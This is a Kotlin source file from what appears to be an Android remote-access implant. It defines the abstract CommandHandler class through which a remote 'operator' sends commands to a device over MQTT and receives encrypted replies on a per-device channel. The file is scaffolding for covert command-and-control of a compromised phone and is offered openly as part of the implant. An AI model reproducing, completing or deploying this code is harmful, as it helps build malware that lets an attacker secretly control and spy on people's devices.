package com.cooperthecoder.implant.command.handlers

/*
* All custom commands must subclass this class.
* A CommandHandler is meant to handle a particular operator command.
* To create a custom command, override the action() method.
* Operator input is available in this.command.arguments.
* To send a response to the operator, use the reply() method.
* It will handle encryption of messages.
* To avoid any tomfoolery by subclasses with plaintext, the client is private.
* */
import android.content.Context
import com.cooperthecoder.implant.Config
import com.cooperthecoder.implant.command.Command
import com.cooperthecoder.implant.crypto.Base64KeyPair
import com.cooperthecoder.implant.crypto.NetworkEncryption
import com.cooperthecoder.implant.data.DeviceProperties
import com.cooperthecoder.implant.data.SharedPreferencesQuery
import org.eclipse.paho.android.service.MqttAndroidClient
import org.eclipse.paho.client.mqttv3.MqttMessage

abstract class CommandHandler(
        context: Context,
        private val client: MqttAndroidClient,
        protected val command: Command
) {

    protected val context: Context = context.applicationContext

    abstract fun action()

    protected fun reply(output: String, error: String) {
        val arguments = hashMapOf(
                "nonce" to command.nonce,
                "output" to output,
                "error" to error
        )
        val reply = Command.Builder()
                .command("reply")
                .arguments(arguments)
                .build()

        val message = MqttMessage()
        val privateKey = Base64KeyPair(SharedPreferencesQuery.getPrivateKey(context)).privateKeyBase64()
        val networkEncryption = NetworkEncryption(
                Config.OPERATOR_PUBLIC_KEY,
                privateKey
        )
        message.payload = reply.json(networkEncryption).toByteArray()
        client.publish(DeviceProperties.replyChannelName(context), message)
    }
}